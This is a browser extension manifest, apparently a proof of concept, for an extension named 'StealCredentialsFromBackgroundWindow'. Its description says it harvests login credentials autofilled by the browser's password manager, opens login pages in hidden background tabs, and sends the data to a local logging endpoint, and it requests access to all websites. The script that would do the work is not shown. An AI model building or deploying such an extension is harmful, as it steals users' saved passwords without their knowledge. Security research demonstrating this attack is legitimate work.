{
    "manifest_version": 2,

    "name": "StealCredentialsFromBackgroundWindow",
    "description": "Extension that steals the data from an login form if the browser's password manager has filled in the credentials. Sends data to http://localhost:3000/log. Explicitly opens login web pages in a new tab in a background window." ,
    "version": "1.0",
	
	"background": {
		"scripts": ["background.js"]
	},
	
	"permissions": [
		"https://*/*",
		"http://*/*"
	]
}
